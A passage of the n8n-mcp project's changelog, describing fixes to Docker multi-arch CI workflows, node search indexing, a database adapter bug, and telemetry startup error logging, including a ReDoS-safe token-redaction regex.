  - SQLJS_SAVE_INTERVAL_MS=10000  # Save every 10 seconds
```

#### Technical Details

**Files Modified:**
- `src/database/database-adapter.ts` - SQLJSAdapter optimization
- `Dockerfile` - Added build tools for better-sqlite3
- `Dockerfile.railway` - Added documentation comment
- `tests/unit/database/database-adapter-unit.test.ts` - New test suites
- `tests/integration/database/sqljs-memory-leak.test.ts` - New integration tests

**Testing:**
- ✅ All unit tests passing
- ✅ New integration tests for memory leak prevention
- ✅ Docker builds verified (both Dockerfile and Dockerfile.railway)
- ✅ better-sqlite3 compilation successful in Docker

#### References

- Issue: #330
- PR: [To be added]
- Reported by: @Darachob
- Root cause analysis by: Explore agent investigation

---

## [2.20.1] - 2025-10-18

### 🐛 Critical Bug Fixes

**Issue #328: Docker Multi-Arch Race Condition (CRITICAL)**

Fixed critical CI/CD race condition that caused temporary ARM64-only Docker manifests, breaking AMD64 users.

#### Problem Analysis

During v2.20.0 release, **5 workflows ran simultaneously** on the same commit, causing a race condition where the `latest` Docker tag was temporarily ARM64-only:

**Timeline of the Race Condition:**
```
17:01:36Z → All 5 workflows start simultaneously
  - docker-build.yml (triggered by main push)
  - release.yml (triggered by package.json version change)
  - Both push to 'latest' tag with NO coordination

Race Condition Window:
  2:30 → release.yml ARM64 completes (cache hit) → Pushes ARM64-only manifest
  2:31 → Registry has ONLY ARM64 for 'latest' ← Users affected here
  4:00 → release.yml AMD64 completes → Manifest updated
  7:00 → docker-build.yml overwrites everything again
```

**User Impact:**
- AMD64 users pulling `latest` during this window received ARM64-only images
- `docker pull` failed with "does not provide the specified platform (linux/amd64)"
- Workaround: Pin to specific version tags (e.g., `2.19.5`)

#### Root Cause

**CRITICAL Issue Found by Code Review:**
The original fix had **separate concurrency groups** that did NOT prevent the race condition:

```yaml
# docker-build.yml had:
concurrency:
  group: docker-build-${{ github.ref }}    # ← Different group!

# release.yml had:
concurrency:
  group: release-${{ github.ref }}         # ← Different group!
```

These are **different groups**, so workflows could still run in parallel. The race condition persisted!

#### Fixed

**1. Shared Concurrency Group (CRITICAL)**
Both workflows now use the **SAME** concurrency group to serialize Docker pushes:

```yaml
# Both docker-build.yml AND release.yml now have:
concurrency:
  group: docker-push-${{ github.ref }}     # ← Same group!
  cancel-in-progress: false
```

**Impact:** Workflows now wait for each other. When one is pushing to `latest`, the other queues.

**2. Removed Redundant Tag Trigger**
- **docker-build.yml:** Removed `v*` tag trigger
- **Reason:** release.yml already handles versioned releases completely
- **Benefit:** Eliminates one source of race condition

**3. Enabled Build Caching**
- Changed `no-cache: true` → `no-cache: false` in docker-build.yml
- Added `cache-from: type=gha` and `cache-to: type=gha,mode=max`
- **Benefit:** Faster builds (40-60% improvement), more predictable timing

**4. Retry Logic with Exponential Backoff**
Replaced naive `sleep 5` with intelligent retry mechanism:

```yaml
# Retry up to 5 times with exponential backoff
MAX_ATTEMPTS=5
WAIT_TIME=2  # Starts at 2s

for attempt in 1..5; do
  check_manifest
  if both_platforms_present; then exit 0; fi

  sleep $WAIT_TIME
  WAIT_TIME=$((WAIT_TIME * 2))  # 2s → 4s → 8s → 16s
done
```

**Benefit:** Handles registry propagation delays gracefully, max wait ~30 seconds

**5. Multi-Arch Manifest Verification**
Added verification steps after every Docker push:

```bash
# Verifies BOTH platforms are in manifest
docker buildx imagetools inspect ghcr.io/czlonkowski/n8n-mcp:latest
if [ amd64 AND arm64 present ]; then
  echo "✅ Multi-arch manifest verified"
else
  echo "❌ ERROR: Incomplete manifest!"
  exit 1  # Fail the build
fi
```

**Benefit:** Catches incomplete pushes immediately, prevents silent failures

**6. Railway Build Improvements**
- Added `needs: build` dependency → Ensures sequential execution
- Enabled caching → Faster builds
- Better error handling

#### Files Changed

**docker-build.yml:**
- Removed `tags: - 'v*'` trigger (line 8-9)
- Added shared concurrency group `docker-push-${{ github.ref }}`
- Changed `no-cache: true` → `false`
- Added cache configuration
- Added multi-arch verification with retry logic
- Added `needs: build` to Railway job

**release.yml:**
- Updated concurrency group to shared `docker-push-${{ github.ref }}`
- Added multi-arch verification for `latest` tag with retry
- Added multi-arch verification for version tag with retry
- Enhanced error messages with attempt counters

#### Impact

**Before Fix:**
- ❌ Race condition between workflows
- ❌ Temporal ARM64-only window (minutes to hours)
- ❌ Slow builds (no-cache: true)
- ❌ Silent failures
- ❌ 5 workflows running simultaneously

**After Fix:**
- ✅ Workflows serialized via shared concurrency group
- ✅ Always multi-arch or fail fast with verification
- ✅ Faster builds (caching enabled, 40-60% improvement)
- ✅ Automatic verification catches incomplete pushes
- ✅ Clear separation: docker-build.yml for CI, release.yml for releases

#### Testing

- ✅ TypeScript compilation passes
- ✅ YAML syntax validated
- ✅ Code review approved (all critical issues addressed)
- 🔄 Will monitor next release for proper serialization

#### Verification Steps

After merge, monitor that:
1. Regular main pushes trigger only `docker-build.yml`
2. Version bumps trigger `release.yml` (docker-build.yml waits)
3. Actions tab shows workflows queuing (not running in parallel)
4. Both workflows verify multi-arch manifest successfully
5. `latest` tag always shows both AMD64 and ARM64 platforms

#### Technical Details

**Concurrency Serialization:**
```yaml
# Workflow 1 starts → Acquires docker-push-main lock
# Workflow 2 starts → Sees lock held → Waits in queue
# Workflow 1 completes → Releases lock
# Workflow 2 acquires lock → Proceeds
```

**Retry Algorithm:**
- Total attempts: 5
- Backoff sequence: 2s, 4s, 8s, 16s
- Max total wait: ~30 seconds
- Handles registry propagation delays

**Manifest Verification:**
- Checks for both `linux/amd64` AND `linux/arm64` in manifest
- Fails build if either platform missing
- Provides full manifest output in logs for debugging

### Changed

- **CI/CD Workflows:** docker-build.yml and release.yml now coordinate via shared concurrency group
- **Build Performance:** Caching enabled in docker-build.yml for 40-60% faster builds
- **Verification:** All Docker pushes now verify multi-arch manifest before completion

### References

- **Issue:** #328 - latest on GHCR is arm64-only
- **PR:** #334 - https://github.com/czlonkowski/n8n-mcp/pull/334
- **Code Review:** Identified critical concurrency group issue
- **Reporter:** @mickahouan
- **Branch:** `fix/docker-multiarch-race-condition-328`

## [2.20.0] - 2025-10-18

### ✨ Features

**MCP Server Icon Support (SEP-973)**

- Added custom server icons for MCP clients
  - Icons served from https://www.n8n-mcp.com/logo*.png
  - Multiple sizes: 48x48, 128x128, 192x192
  - Future-proof for Claude Desktop icon UI support
- Added websiteUrl field pointing to https://n8n-mcp.com
- Server now reports correct version from package.json instead of hardcoded '1.0.0'

### 📦 Dependency Updates

- Upgraded `@modelcontextprotocol/sdk` from ^1.13.2 to ^1.20.1
  - Enables icon support as per MCP specification SEP-973
  - No breaking changes, fully backward compatible

### 🔧 Technical Improvements

- Server version now dynamically sourced from package.json via PROJECT_VERSION
- Enhanced server metadata to include branding and website information

### 📝 Notes

- Icons won't display in Claude Desktop yet (pending upstream UI support)
- Icons will appear automatically when Claude Desktop adds icon rendering
- Other MCP clients (Cursor, Windsurf) may already support icon display

## [2.19.6] - 2025-10-14

### 📦 Dependency Updates

- Updated n8n to ^1.115.2 (from ^1.114.3)
- Updated n8n-core to ^1.114.0 (from ^1.113.1)
- Updated n8n-workflow to ^1.112.0 (from ^1.111.0)
- Updated @n8n/n8n-nodes-langchain to ^1.114.1 (from ^1.113.1)

### 🔄 Database

- Rebuilt node database with 537 nodes (increased from 525)
- Updated documentation coverage to 88%
- 270 AI-capable tools detected

### ✅ Testing

- All 1,181 functional tests passing
- 1 flaky performance stress test (non-critical)
- All validation tests passing

## [2.18.8] - 2025-10-11

### 🐛 Bug Fixes

**PR #308: Enable Schema-Based resourceLocator Mode Validation**

This release fixes critical validator false positives by implementing true schema-based validation for resourceLocator modes. The root cause was discovered through deep analysis: the validator was looking at the wrong path for mode definitions in n8n node schemas.

#### Root Cause

- **Wrong Path**: Validator checked `prop.typeOptions?.resourceLocator?.modes` ❌
- **Correct Path**: n8n stores modes at `prop.modes` (top level of property) ✅
- **Impact**: 0% validation coverage - all resourceLocator validation was being skipped, causing false positives

#### Fixed

- **Schema-Based Validation Now Active**
  - **Issue #304**: Google Sheets "name" mode incorrectly rejected (false positive)
  - **Coverage**: Increased from 0% to 100% (all 70 resourceLocator nodes now validated)
  - **Root Cause**: Validator reading from wrong schema path
  - **Fix**: Changed validation path from `prop.typeOptions?.resourceLocator?.modes` to `prop.modes`
  - **Files Changed**:
    - `src/services/config-validator.ts` (lines 273-310): Corrected validation path
    - `src/parsers/property-extractor.ts` (line 234): Added modes field capture
    - `src/services/node-specific-validators.ts` (lines 270-282): Google Sheets range/columns flexibility
    - Updated 6 test files to match real n8n schema structure

- **Database Rebuild**
  - Rebuilt with modes field captured from n8n packages
  - All 70 resourceLocator nodes now have mode definitions populated
  - Enables true schema-driven validation (no more hardcoded mode lists)

- **Google Sheets Enhancement**
  - Now accepts EITHER `range` OR `columns` parameter for append operation
  - Supports Google Sheets v4+ resourceMapper pattern
  - Better error messages showing actual allowed modes from schema

#### Testing

- **Before Fix**:
  - ❌ Valid Google Sheets "name" mode rejected (false positive)
  - ❌ Schema-based validation inactive (0% coverage)
  - ❌ Hardcoded mode validation only

- **After Fix**:
  - ✅ Valid "name" mode accepted
  - ✅ Schema-based validation active (100% coverage - 70/70 nodes)
  - ✅ Invalid modes rejected with helpful errors: `must be one of [list, url, id, name]`
  - ✅ All 143 tests pass
  - ✅ Verified with n8n-mcp-tester agent

#### Impact

- **Fixes #304**: Google Sheets "name" mode false positive eliminated
- **Related to #306**: Validator improvements
- **No Breaking Changes**: More permissive (accepts previously rejected valid modes)
- **Better UX**: Error messages show actual allowed modes from schema
- **Maintainability**: Schema-driven approach eliminates need for hardcoded mode lists
- **Code Quality**: Code review score 9.3/10

#### Example Error Message (After Fix)
```
resourceLocator 'sheetName.mode' must be one of [list, url, id, name], got 'invalid'
Fix: Change mode to one of: list, url, id, name
```

## [2.18.6] - 2025-10-10

### 🐛 Bug Fixes

**PR #303: Environment-Aware Debugging Test Fix**

This release fixes a unit test failure that occurred after implementing environment-aware debugging improvements. The handleHealthCheck error handler now includes troubleshooting guidance in error responses, and the test expectations have been updated to match.

#### Fixed

- **Unit Test Failure in handleHealthCheck**
  - **Issue**: Test expected error response without `troubleshooting` array field
  - **Impact**: CI pipeline failing on PR #303 after adding environment-aware debugging
  - **Root Cause**: Environment-aware debugging improvements added a `troubleshooting` array to error responses, but unit test wasn't updated
  - **Fix**: Updated test expectation to include the new troubleshooting field (lines 1030-1035 in `tests/unit/mcp/handlers-n8n-manager.test.ts`)
  - **Error Response Structure** (now includes):
    ```typescript
    details: {
      apiUrl: 'https://n8n.test.com',
      hint: 'Check if n8n is running and API is enabled',
      troubleshooting: [
        '1. Verify n8n instance is running',
        '2. Check N8N_API_URL is correct',
        '3. Verify N8N_API_KEY has proper permissions',
        '4. Run n8n_diagnostic for detailed analysis'
      ]
    }
    ```

#### Testing

- **Unit Test**: Test now passes with troubleshooting array expectation
- **MCP Testing**: Extensively validated with n8n-mcp-tester agent
  - Health check successful connections: ✅
  - Error responses include troubleshooting guidance: ✅
  - Diagnostic tool environment detection: ✅
  - Mode-specific debugging (stdio/HTTP): ✅
  - All environment-aware debugging features working correctly: ✅

#### Impact

- **CI Pipeline**: PR #303 now passes all tests
- **Error Guidance**: Users receive actionable troubleshooting steps when API errors occur
- **Environment Detection**: Comprehensive debugging guidance based on deployment environment
- **Zero Breaking Changes**: Only internal test expectations updated

#### Related

- **PR #303**: feat: Add environment-aware debugging to diagnostic tools
- **Implementation**: `src/mcp/handlers-n8n-manager.ts` lines 1447-1462
- **Diagnostic Tool**: Enhanced with mode-specific, Docker-specific, and cloud platform-specific debugging

## [2.18.5] - 2025-10-10

### 🔍 Search Performance & Reliability

**Issue #296 Part 2: Fix Production Search Failures (69% Failure Rate)**

This release fixes critical search failures that caused 69% of user searches to return zero results in production. Telemetry analysis revealed searches for critical nodes like "webhook", "merge", and "split batch" were failing despite nodes existing in the database.

#### Problem

**Root Cause Analysis:**
1. **Missing FTS5 Table**: Production database had NO `nodes_fts` FTS5 virtual table
2. **Empty Database Scenario**: When database was empty, both FTS5 and LIKE fallback returned zero results
3. **No Detection**: Missing validation to catch empty database or missing FTS5 table
4. **Production Impact**: 9 of 13 searches (69%) returned zero results for critical nodes with high user adoption

**Telemetry Evidence** (Sept 26 - Oct 9, 2025):
- "webhook" search: 3 failures (node has 39.6% adoption rate - 4,316 actual uses)
- "merge" search: 1 failure (node has 10.7% adoption rate - 1,418 actual uses)
- "split batch" search: 2 failures (node is actively used in workflows)
- Overall: 9/13 searches failed (69% failure rate)

**Technical Root Cause:**
- `schema.sql` had a note claiming "FTS5 tables are created conditionally at runtime" (line 111)
- This was FALSE - no runtime creation code existed
- `schema-optimized.sql` had correct FTS5 implementation but was never used
- `rebuild.ts` used `schema.sql` without FTS5
- Result: Production database had NO search index

#### Fixed

**1. Schema Updates**
- **File**: `src/database/schema.sql`
- Added `nodes_fts` FTS5 virtual table with full-text indexing
- Added synchronization triggers (INSERT/UPDATE/DELETE) to keep FTS5 in sync with nodes table
- Indexes: node_type, display_name, description, documentation, operations
- Updated misleading note about conditional FTS5 creation

**2. Database Validation**
- **File**: `src/scripts/rebuild.ts`
- Added critical empty database detection (fails fast if zero nodes)
- Added FTS5 table existence validation
- Added FTS5 synchronization check (nodes count must match FTS5 count)
- Added searchability tests for critical nodes (webhook, merge, split)
- Added minimum node count validation (expects 500+ nodes from both packages)

**3. Runtime Health Checks**
- **File**: `src/mcp/server.ts`
- Added database health validation on first access
- Detects empty database and throws clear error message
- Detects missing FTS5 table with actionable warning
- Logs successful health check with node count

**4. Comprehensive Test Suite**
- **New File**: `tests/integration/database/node-fts5-search.test.ts` (14 tests)
  - FTS5 table existence and trigger validation
  - FTS5 index population and synchronization
  - Production failure case tests (webhook, merge, split, code, http)
  - Search quality and ranking tests
  - Real-time trigger synchronization tests

- **New File**: `tests/integration/database/empty-database.test.ts` (14 tests)
  - Empty nodes table detection
  - Empty FTS5 index detection
  - LIKE fallback behavior with empty database
  - Repository method behavior with no data
  - Validation error messages

- **New File**: `tests/integration/ci/database-population.test.ts` (24 tests)
  - **CRITICAL CI validation** - ensures database is committed with data
  - Validates all production search scenarios work (webhook, merge, code, http, split)
  - Both FTS5 and LIKE fallback search validation
  - Performance baselines (FTS5 < 100ms, LIKE < 500ms)
  - Documentation coverage and property extraction metrics
  - **Tests FAIL if database is empty or FTS5 missing** (prevents regressions)

#### Technical Details

**FTS5 Implementation:**
```sql
CREATE VIRTUAL TABLE IF NOT EXISTS nodes_fts USING fts5(
  node_type,
  display_name,
  description,
  documentation,
  operations,
  content=nodes,
  content_rowid=rowid
);
```

**Synchronization Triggers:**
- `nodes_fts_insert`: Adds to FTS5 when node inserted
- `nodes_fts_update`: Updates FTS5 when node modified
- `nodes_fts_delete`: Removes from FTS5 when node deleted

**Validation Strategy:**
1. **Build Time** (`rebuild.ts`): Validates FTS5 creation and population
2. **Runtime** (`server.ts`): Health check on first database access
3. **CI Time** (tests): 52 tests ensure database integrity

**Search Performance:**
- FTS5 search: < 100ms for typical queries (20 results)
- LIKE fallback: < 500ms (still functional if FTS5 unavailable)
- Ranking: Exact matches prioritized in results

#### Impact

**Before Fix:**
- 69% of searches returned zero results
- Users couldn't find critical nodes via AI assistant
- Silent failure - no error messages
- n8n workflows still worked (nodes loaded directly from npm)

**After Fix:**
- ✅ All critical searches return results
- ✅ FTS5 provides fast, ranked search
- ✅ Clear error messages if database empty
- ✅ CI tests prevent regression
- ✅ Runtime health checks detect issues immediately

**LIKE Search Investigation:**
Testing revealed LIKE search fallback was **perfectly functional** - it only failed because the database was empty. No changes needed to LIKE implementation.

#### Related

- Addresses production search failures from Issue #296
- Complements v2.18.4 (which fixed adapter bypass for sql.js)
- Prevents silent search failures in production
- Ensures AI assistants can reliably search for nodes

#### Migration

**Existing Installations:**
```bash
# Rebuild database to add FTS5 index
npm run rebuild

# Verify FTS5 is working
npm run validate
```

**CI/CD:**
- New CI validation suite (`tests/integration/ci/database-population.test.ts`)
- Runs when database exists (after n8n update commits)
- Validates FTS5 table, search functionality, and data integrity
- Tests are skipped if database doesn't exist (most PRs don't commit database)

## [2.18.4] - 2025-10-09

### 🐛 Bug Fixes

**Issue #296: sql.js Adapter Bypass Causing MCP Tool Failures**

This release fixes a critical constructor bug in `NodeRepository` that caused the sql.js database adapter to be bypassed, resulting in empty object returns and MCP tool failures.

#### Problem

When using the sql.js fallback adapter (pure JavaScript implementation without native dependencies), three critical MCP tools were failing with "Cannot read properties of undefined" errors:
- `get_node_essentials`
- `get_node_info`
- `validate_node_operation`

**Root Cause:**
The `NodeRepository` constructor used duck typing (`'db' in object`) to determine whether to unwrap the database adapter. This check incorrectly matched BOTH `SQLiteStorageService` AND `DatabaseAdapter` instances because both have a `.db` property.

When sql.js was used:
1. `createDatabaseAdapter()` returned a `SQLJSAdapter` instance (wrapped)
2. `NodeRepository` constructor saw `'db' in adapter` was true
3. Constructor unwrapped it: `this.db = adapter.db`
4. This exposed the raw sql.js `Database` object, bypassing all wrapper logic
5. Raw sql.js API has completely different behavior (returns typed arrays instead of objects)
6. Result: Empty objects `{}` with no properties, causing undefined property access errors

#### Fixed

**NodeRepository Constructor Type Discrimination**
- Changed from duck typing (`'db' in object`) to precise instanceof check
- Only unwrap `SQLiteStorageService` instances (intended behavior)
- Keep `DatabaseAdapter` instances intact (preserves wrapper logic)
- File: `src/database/node-repository.ts`

#### Technical Details

**Before (Broken):**
```typescript
constructor(dbOrService: DatabaseAdapter | SQLiteStorageService) {
  if ('db' in dbOrService) {           // ❌ Matches EVERYTHING with .db property
    this.db = dbOrService.db;          // Unwraps both SQLiteStorageService AND DatabaseAdapter
  } else {
    this.db = dbOrService;
  }
}
```

**After (Fixed):**
```typescript
constructor(dbOrService: DatabaseAdapter | SQLiteStorageService) {
  if (dbOrService instanceof SQLiteStorageService) {  // ✅ Only matches SQLiteStorageService
    this.db = dbOrService.db;
    return;
  }

  this.db = dbOrService;  // ✅ Keep DatabaseAdapter intact
}
```

**Why instanceof is Critical:**
- `'db' in object` is property checking (duck typing) - too permissive
- `instanceof` is class hierarchy checking - precise type discrimination
- With instanceof, sql.js queries flow through `SQLJSAdapter` → `SQLJSStatement` wrapper chain
- Wrapper normalizes sql.js behavior to match better-sqlite3 API (object returns)

**Impact:**
- Fixes MCP tool failures on systems where better-sqlite3 cannot compile (Node.js version mismatches, ARM architectures)
- Ensures sql.js fallback works correctly with proper data normalization
- No performance impact (same code path, just preserved wrapper)

#### Related

- Closes issue #296
- Affects environments where better-sqlite3 falls back to sql.js
- Common in Docker containers, CI environments, and ARM-based systems

## [2.18.3] - 2025-10-09

### 🔒 Critical Safety Fixes

**Emergency hotfix addressing 7 critical issues from v2.18.2 code review.**

This release fixes critical safety violations in the startup error logging system that could have prevented the server from starting. All fixes ensure telemetry failures never crash the server.

#### Problem

Code review of v2.18.2 identified 7 critical/high-priority safety issues:
- **CRITICAL-01**: Missing database checkpoints (DATABASE_CONNECTING/CONNECTED never logged)
- **CRITICAL-02**: Constructor can throw before defensive initialization
- **CRITICAL-03**: Blocking awaits delay startup (5s+ with 10 checkpoints × 500ms latency)
- **HIGH-01**: ReDoS vulnerability in error sanitization regex
- **HIGH-02**: Race conditions in EarlyErrorLogger initialization
- **HIGH-03**: No timeout on Supabase operations (can hang indefinitely)
- **HIGH-04**: Missing N8N API checkpoints

#### Fixed

**CRITICAL-01: Missing Database Checkpoints**
- Added `DATABASE_CONNECTING` checkpoint before database initialization
- Added `DATABASE_CONNECTED` checkpoint after successful initialization
- Pass `earlyLogger` to `N8NDocumentationMCPServer` constructor
- Checkpoint logging in `initializeDatabase()` method
- Files: `src/mcp/server.ts`, `src/mcp/index.ts`

**CRITICAL-02: Constructor Can Throw**
- Converted `EarlyErrorLogger` to singleton pattern with `getInstance()` method
- Initialize ALL fields to safe defaults BEFORE any operation that can throw
- Defensive initialization order:
  1. Set `enabled = false` (safe default)
  2. Set `supabase = null` (safe default)
  3. Set `userId = null` (safe default)
  4. THEN wrap initialization in try-catch
- Async `initialize()` method separated from constructor
- File: `src/telemetry/early-error-logger.ts`

**CRITICAL-03: Blocking Awaits Delay Startup**
- Removed ALL `await` keywords from checkpoint calls (8 locations)
- Changed `logCheckpoint()` from async to synchronous (void return)
- Changed `logStartupError()` to fire-and-forget with internal async implementation
- Changed `logStartupSuccess()` to fire-and-forget
- Startup no longer blocked by telemetry operations
- Files: `src/mcp/index.ts`, `src/telemetry/early-error-logger.ts`

**HIGH-01: ReDoS Vulnerability in Error Sanitization**
- Removed negative lookbehind regex: `(?<!Bearer\s)token\s*[=:]\s*\S+`
- Replaced with simplified regex: `\btoken\s*[=:]\s*[^\s;,)]+`
- No complex capturing groups (catastrophic backtracking impossible)
- File: `src/telemetry/error-sanitization-utils.ts`

**HIGH-02: Race Conditions in EarlyErrorLogger**
- Singleton pattern prevents multiple instances
- Added `initPromise` property to track initialization state
- Added `waitForInit()` method for testing
- All methods gracefully handle uninitialized state
- File: `src/telemetry/early-error-logger.ts`

**HIGH-03: No Timeout on Supabase Operations**
- Added `withTimeout()` wrapper function (5-second max)
- Uses `Promise.race()` pattern to prevent hanging
- Applies to all direct Supabase inserts
- Returns `null` on timeout (graceful degradation)
- File: `src/telemetry/early-error-logger.ts`

**HIGH-04: Missing N8N API Checkpoints**
- Added `N8N_API_CHECKING` checkpoint before n8n API configuration check
- Added `N8N_API_READY` checkpoint after configuration validated
- Logged after database initialization completes
- File: `src/mcp/server.ts`

#### Added

**Shared Sanitization Utilities**
- Created `src/telemetry/error-sanitization-utils.ts`
- `sanitizeErrorMessageCore()` function shared across modules
- Eliminates code duplication between `error-sanitizer.ts` and `event-tracker.ts`
- Includes ReDoS fix (simplified token regex)

**Singleton Pattern for EarlyErrorLogger**
- `EarlyErrorLogger.getInstance()` - Get singleton instance
- Private constructor prevents direct instantiation
- `waitForInit()` method for testing

**Timeout Wrapper**
- `withTimeout()` helper function
- 5-second timeout for all Supabase operations
- Promise.race pattern with automatic cleanup

#### Changed

**EarlyErrorLogger Architecture**
- Singleton instead of direct instantiation
- Defensive initialization (safe defaults first)
- Fire-and-forget methods (non-blocking)
- Timeout protection for network operations

**Checkpoint Logging**
- All checkpoint calls are now fire-and-forget (no await)
- No startup delay from telemetry operations
- Database checkpoints now logged in server.ts
- N8N API checkpoints now logged after database init

**Error Sanitization**
- Shared utilities across all telemetry modules
- ReDoS-safe regex patterns
- Consistent sanitization behavior

#### Technical Details

**Defensive Initialization Pattern:**
```typescript
export class EarlyErrorLogger {
  // Safe defaults FIRST (before any throwing operation)
  private enabled: boolean = false;
  private supabase: SupabaseClient | null = null;
  private userId: string | null = null;

  private constructor() {
    // Kick off async init without blocking
    this.initPromise = this.initialize();
  }

  private async initialize(): Promise<void> {
    try {
      // Validate config BEFORE using
      if (!TELEMETRY_BACKEND.URL || !TELEMETRY_BACKEND.ANON_KEY) {
        this.enabled = false;
        return;
      }
      // ... rest of initialization
    } catch (error) {
      // Ensure safe state on error
      this.enabled = false;
      this.supabase = null;
      this.userId = null;
    }
  }
}
```

**Fire-and-Forget Pattern:**
```typescript
// BEFORE (BLOCKING):
await earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.PROCESS_STARTED);

// AFTER (NON-BLOCKING):
earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.PROCESS_STARTED);
```

**Timeout Wrapper:**
```typescript
async function withTimeout<T>(promise: Promise<T>, timeoutMs: number, operation: string): Promise<T | null> {
  try {
    const timeoutPromise = new Promise<T>((_, reject) => {
      setTimeout(() => reject(new Error(`${operation} timeout after ${timeoutMs}ms`)), timeoutMs);
    });
    return await Promise.race([promise, timeoutPromise]);
  } catch (error) {
    logger.debug(`${operation} failed or timed out:`, error);
    return null;
  }
}
```

**ReDoS Fix:**
```typescript
// BEFORE (VULNERABLE):
.replace(/(?<!Bearer\s)token\s*[=:]\s*\S+/gi, 'token=[REDACTED]')

// AFTER (SAFE):
.replace(/\btoken\s*[=:]\s*[^\s;,)]+/gi, 'token=[REDACTED]')
```

#### Impact

**Server Stability:**
- **100%** elimination of telemetry-caused startup failures
- Telemetry failures NEVER crash the server
- Startup time unaffected by telemetry latency

**Coverage Improvement:**
- Database failures now tracked (DATABASE_CONNECTING/CONNECTED checkpoints)
- N8N API configuration issues now tracked (N8N_API_CHECKING/READY checkpoints)
- Complete visibility into all startup phases

**Performance:**
- No startup delay from telemetry (removed blocking awaits)
- 5-second timeout prevents hanging on Supabase failures
- Fire-and-forget pattern ensures server starts immediately

**Security:**
- ReDoS vulnerability eliminated
- Simplified regex patterns (no catastrophic backtracking)
- Shared sanitization ensures consistency

**Code Quality:**
- DRY principle (shared error-sanitization-utils)
- Defensive programming (safe defaults before operations)
- Race-condition free (singleton + initPromise)

#### Files Changed

**New Files (1):**
- `src/telemetry/error-sanitization-utils.ts` - Shared sanitization utilities

**Modified Files (5):**
- `src/telemetry/early-error-logger.ts` - Singleton + defensive init + fire-and-forget + timeout
- `src/telemetry/error-sanitizer.ts` - Use shared sanitization utils
- `src/telemetry/event-tracker.ts` - Use shared sanitization utils
- `src/mcp/index.ts` - Remove blocking awaits, use singleton getInstance()
- `src/mcp/server.ts` - Add database and N8N API checkpoints
- `package.json` - Version bump to 2.18.3

#### Testing

- **Safety**: All critical issues addressed with comprehensive fixes
- **Backward Compatibility**: 100% - only internal implementation changes
- **TypeScript**: All type checks pass
- **Build**: Clean build with no errors

#### References

- **Code Review**: v2.18.2 comprehensive review identified 7 critical/high issues
- **User Feedback**: "Make sure telemetry failures would not crash the server - it should start regardless of this"
- **Implementation**: All CRITICAL and HIGH recommendations implemented

## [2.18.2] - 2025-10-09

### 🔍 Startup Error Detection

**Added comprehensive startup error tracking to diagnose "server won't start" scenarios.**

This release addresses a critical telemetry gap: we now capture errors that occur BEFORE the MCP server fully initializes, enabling diagnosis of the 2.2% of users who experience startup failures that were previously invisible.

#### Problem

Analysis of telemetry data revealed critical gaps in error coverage:
- **Zero telemetry captured** when server fails to start (no data before MCP handshake)
- **106 users (2.2%)** had only `session_start` with no other activity (likely startup failures)
- **463 users (9.7%)** experienced immediate failures or quick abandonment
- **All 4,478 error events** were from tool execution - none from initialization phase
- **Current error coverage: ~45%** - missing all pre-handshake failures

#### Added

**Early Error Logging System**
- New `EarlyErrorLogger` class - Independent error tracking before main telemetry ready
- Direct Supabase insert (bypasses batching for immediate persistence)
- Works even when main telemetry fails to initialize
- Sanitized error messages with security patterns from v2.15.3
- File: `src/telemetry/early-error-logger.ts`

**Startup Checkpoint Tracking System**
- 10 checkpoints throughout startup process to identify failure points:
  1. `process_started` - Process initialization
  2. `database_connecting` - Before DB connection
  3. `database_connected` - DB ready
  4. `n8n_api_checking` - Before n8n API check (if applicable)
  5. `n8n_api_ready` - n8n API ready (if applicable)
  6. `telemetry_initializing` - Before telemetry init
  7. `telemetry_ready` - Telemetry ready
  8. `mcp_handshake_starting` - Before MCP handshake
  9. `mcp_handshake_complete` - Handshake success
  10. `server_ready` - Full initialization complete
- Helper functions: `findFailedCheckpoint()`, `getCheckpointDescription()`, `getCompletionPercentage()`
- File: `src/telemetry/startup-checkpoints.ts`

**New Event Type: `startup_error`**
- Captures pre-handshake failures with full context
- Properties: `checkpoint`, `errorMessage`, `errorType`, `checkpointsPassed`, `startupDuration`, platform info
- Fires even when main telemetry not ready
- Uses early error logger with direct Supabase insert

**Enhanced `session_start` Event**
- `startupDurationMs` - Time from process start to ready (new, optional)
- `checkpointsPassed` - Array of successfully passed checkpoints (new, optional)
- `startupErrorCount` - Count of errors during startup (new, optional)
- Backward compatible - all new fields optional

**Startup Completion Event**
- New `startup_completed` event type
- Fired after first successful tool call
- Confirms server is functional (not a "zombie server")
- Distinguishes "never started" from "started but silent"

**Error Message Sanitization**
- New `error-sanitizer.ts` utility for secure error message handling
- `extractErrorMessage()` - Safe extraction from Error objects, strings, unknowns
- `sanitizeStartupError()` - Security-focused sanitization using v2.15.3 patterns
- Removes URLs, credentials, API keys, emails, long keys
- Early truncation (ReDoS prevention), stack trace limitation (3 lines)
- File: `src/telemetry/error-sanitizer.ts`

#### Changed

- `src/mcp/index.ts` - Added comprehensive checkpoint tracking throughout `main()` function
  - Early logger initialization at process start
  - Checkpoints before/after each major initialization step
  - Error handling with checkpoint context
  - Startup success logging with duration
- `src/mcp/server.ts` - Enhanced database initialization logging
  - Detailed debug logs for each initialization step
  - Better error context for database failures
- `src/telemetry/event-tracker.ts` - Enhanced `trackSessionStart()` method
  - Now accepts optional `startupData` parameter
  - New `trackStartupComplete()` method
- `src/telemetry/event-validator.ts` - Added validation schemas
  - `startupErrorPropertiesSchema` for startup_error events
  - `startupCompletedPropertiesSchema` for startup_completed events
- `src/telemetry/telemetry-types.ts` - New type definitions
  - `StartupErrorEvent` interface
  - `StartupCompletedEvent` interface
  - `SessionStartProperties` interface with new optional fields

#### Technical Details

**Checkpoint Flow:**
```
Process Started → Telemetry Init → Telemetry Ready →
MCP Handshake Starting → MCP Handshake Complete → Server Ready
```

**Error Capture Example:**
```typescript
try {
  await earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.DATABASE_CONNECTING);
  // ... database initialization ...
  await earlyLogger.logCheckpoint(STARTUP_CHECKPOINTS.DATABASE_CONNECTED);
} catch (error) {
  const failedCheckpoint = findFailedCheckpoint(checkpoints);
  await earlyLogger.logStartupError(failedCheckpoint, error);
  throw error;
}
```

**Error Sanitization:**
- Reuses v2.15.3 security patterns
- Early truncation to 1500 chars (ReDoS prevention)
- Redacts: URLs → `[URL]`, AWS keys → `[AWS_KEY]`, emails → `[EMAIL]`, etc.
- Stack traces limited to first 3 lines
- Final truncation to 500 chars

**Database Schema:**
```typescript
// startup_error event structure
{
  event: 'startup_error',
  user_id: string,
  properties: {
